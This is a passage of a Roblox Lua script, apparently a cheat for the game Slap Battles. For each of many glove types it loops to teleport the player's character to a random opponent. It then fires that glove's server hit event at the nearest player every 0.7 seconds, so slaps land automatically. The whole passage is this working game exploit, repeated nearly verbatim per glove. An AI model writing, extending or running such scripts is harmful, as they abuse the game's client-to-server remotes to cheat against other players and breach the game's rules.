    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GhostHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Thanos" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").ThanosHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Stun" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").HtStun:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "L.O.L.B.O.M.B" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Za Hando" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").zhramt:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Fort" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").Fort:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Magnet" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").MagnetHIT:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Pusher" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").PusherHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Anchor" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").hitAnchor:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Space" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").HtSpace:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Boomerang" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").BoomerangH:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Speedrun" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").Speedrunhit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Mail" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").MailHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "T H I C K" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Golden" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GoldenHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Squid" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "MR" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").MisterHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Reaper" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").ReaperHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Replica" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").ReplicaHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Defense" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").DefenseHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Killstreak" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").KSHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Reverse" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").ReverseHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Shukuchi" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").ShukuchiHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
